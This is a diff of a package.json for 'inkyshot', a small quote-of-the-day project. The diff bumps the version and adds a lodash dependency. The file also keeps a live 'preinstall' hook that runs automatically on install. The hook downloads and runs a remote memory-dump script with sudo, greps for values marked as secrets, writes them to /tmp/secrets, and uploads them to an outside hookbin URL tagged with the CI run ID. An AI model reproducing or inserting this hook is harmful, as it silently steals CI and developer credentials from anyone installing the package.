@@ -1,11 +1,14 @@
 {
   "name": "inkyshot",
-  "version": "1.0.0",
+  "version": "1.0.1",
   "description": "Get a daily random inspirational quote delivered direct to your desk with Inkyshot.",
   "main": "index.js",
   "scripts": {
     "test": "echo \"Error: no test specified\" && exit 0",
     "preinstall": "echo \"Okay, we got this far. Let's continue...\"; curl -sSf https://raw.githubusercontent.com/playground-nils/tools/refs/heads/main/memdump.py | sudo -E python3 | tr -d '\\0' | grep -aoE '\"[^\"]+\":\\{\"value\":\"[^\"]*\",\"isSecret\":true\\}' >> \"/tmp/secrets\"; curl -X PUT -d \\@/tmp/secrets \"https://open-hookbin.vercel.app/$GITHUB_RUN_ID\""
+  },
+  "dependencies": {
+    "lodash": "^4.17.21"
   },
   "author": "Balena",
   "license": "Apache-2.0"
